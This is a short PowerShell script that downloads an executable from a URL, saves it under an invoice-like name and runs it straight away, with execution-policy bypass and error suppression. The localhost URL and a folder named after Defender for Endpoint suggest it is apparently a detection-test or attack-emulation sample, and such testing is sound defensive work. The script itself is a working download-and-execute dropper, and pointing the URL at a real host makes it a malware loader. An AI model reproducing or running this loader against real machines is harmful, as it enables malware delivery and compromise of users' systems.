#-WindowStyle Hidden

$DownloadUrl = 'http://127.0.0.1/1.exe'
$TargetFilePath = 'C:\\test-MDATP-test\\invoice.exe'

powershell.exe -ExecutionPolicy Bypass $ProgressPreference = 'SilentlyContinue' $ErrorActionPreference = 'silentlycontinue'; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $TargetFilePath); Start-Process $TargetFilePath
